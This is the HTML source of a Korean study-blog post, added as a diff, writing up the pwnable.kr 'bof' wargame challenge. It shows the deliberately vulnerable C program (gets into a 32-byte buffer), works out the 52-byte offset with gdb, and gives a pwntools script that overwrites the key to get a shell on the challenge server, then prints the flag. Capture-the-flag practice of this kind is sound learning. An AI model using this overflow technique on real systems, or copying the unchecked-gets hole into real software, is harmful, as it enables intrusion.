@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark-poole">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      pwnable.kr wargame bof write-up &middot; 찬인의 Computer study note
+    
+  </title>
+
+  <link rel="stylesheet" href="/styles.css">
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/assets/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="/assets/favicon.ico">
+  <link rel="alternate" type="application/atom+xml" title="찬인의 Computer study note" href="/atom.xml">
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="pwnable.kr wargame bof write-up" />
+<meta name="author" content="김찬인" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="문제는 pwnable.kr에서 받으실 수 있습니다." />
+<meta property="og:description" content="문제는 pwnable.kr에서 받으실 수 있습니다." />
+<link rel="canonical" href="http://localhost:4000/2020/03/24/pwnable.kr_bof_writeup/" />
+<meta property="og:url" content="http://localhost:4000/2020/03/24/pwnable.kr_bof_writeup/" />
+<meta property="og:site_name" content="찬인의 Computer study note" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-03-24T00:00:00+09:00" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/2020/03/24/pwnable.kr_bof_writeup/","headline":"pwnable.kr wargame bof write-up","dateModified":"2020-03-24T00:00:00+09:00","datePublished":"2020-03-24T00:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/03/24/pwnable.kr_bof_writeup/"},"author":{"@type":"Person","name":"김찬인"},"description":"문제는 pwnable.kr에서 받으실 수 있습니다.","@type":"BlogPosting","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <div class="container content">
+      <header class="masthead">
+        <h3 class="masthead-title">
+          <a href="/" title="Home">찬인의 Computer study note</a>
+
+          <nav class="nav">
+            
+            <small><a href="/archive">Blog</a></small>
+            
+            <small><a href="/about">About</a></small>
+            
+          </nav>
+        </h3>
+      </header>
+
+      <main>
+        <article class="post">
+  <h1 class="post-title">pwnable.kr wargame bof write-up</h1>
+  <time datetime="2020-03-24T00:00:00+09:00" class="post-date">24 Mar 2020</time>
+  <p><br />
+문제는 <a href="http://pwnable.kr/play.php">pwnable.kr</a>에서 받으실 수 있습니다.</p>
+
+<hr />
+
+<p><br /></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+  <span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span><span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+  <span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>key가 0xcafebabe이면 쉘을 실행시켜준다.<br />
+입력은 overflowme 변수에 받기 때문에 key와 overflowme의 거리를 알면<br />
+bof를 할 수 있을 것이다.<br />
+gdb로 실행시켜보자.<br /></p>
+
+<p><img src="/assets/img.png" alt="img1" /></p>
+
+<p>두번째 함수 콜은 gets 함수를 호출하는 부분이다.
+<br /><br />여기에 overflowme가 인자로 들어가니까 
+<br /><strong>overflowme는 ebp - 0x2c</strong> 에 있음을 알 수 있다.
+<br /><br />그 아래에 ebp+0x8 위치와 0xcafebabe를 비교하니까 
+<br /><strong>key는 ebp + 0x8</strong> 에 위치하는 것을 알 수 있다.
+<br /><br />bof를 위해 채워줘야 하는 문자의 수는 <strong>0x2c + 0x8 = 0x34(52)</strong> 이다.
+<br />이제 페이로드를 짜고 실행시켜보자.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span><span class="s">'9000'</span><span class="p">)</span>
+<span class="c1">#p = process('./bof')
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">52</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">'</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<p><img src="/assets/img2.png" alt="img2" />
+성공적으로 쉘을 획득했다.
+<br />
+FLAG : daddy, I just pwned a buFFer :)</p>
+
+</article>
+
+
+
+      </main>
+
+      <footer class="footer">
+        <small>
+          &copy;
+          <time datetime="2021-03-24T16:24:12+09:00"
+            >2021</time
+          >. All rights reserved.
+        </small>
+      </footer>
+    </div>
+
+    
+  </body>
+</html>
